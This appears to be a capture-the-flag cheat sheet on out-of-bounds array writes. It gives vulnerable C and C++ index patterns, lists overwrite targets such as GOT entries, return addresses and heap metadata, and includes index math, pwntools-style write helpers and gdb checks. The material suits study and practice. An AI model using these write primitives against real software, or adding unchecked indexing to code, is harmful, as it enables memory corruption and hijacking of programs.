# OOB

## Bug Shapes

```c
arr[idx] = value;              // no bounds check
arr[(unsigned)idx] = value;    // signed/unsigned confusion
vec[idx] = value;              // std::vector operator[] no bounds check
buf[i + base] = value;         // base/index arithmetic bug
```

## First Targets

```text
global auth flag
function pointer / vtable pointer
GOT entry when writable
saved return address / saved frame pointer
heap chunk size / fd / bk
adjacent object field
```

## Index Math

For qword arrays:

```python
idx = (target - array_base) // 8
```

For byte arrays:

```python
idx = target - array_base
```

For negative index before an array:

```python
idx = -((array_base - target) // 8)
```

## C++ Vector

Pattern:

```cpp
std::vector<long long> vec;
std::cin >> idx;
std::cin >> num;
vec[idx] = num;
```

`operator[]` does not check bounds. If `idx` is signed, try negative indexes.

```python
def edit(idx, value):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Idx: ", str(idx).encode())
    io.sendlineafter(b"New Num: ", str(value).encode())
```

## Write Helpers

```python
def write_qword(target, value):
    idx = (target - array_base) // 8
    edit(idx, value)

def write_byte(target, value):
    idx = target - array_base
    edit(idx, value)
```

## Checks

```gdb
p/x &arr
p/x &target
x/20gx &arr
watch *(long long*)target
```
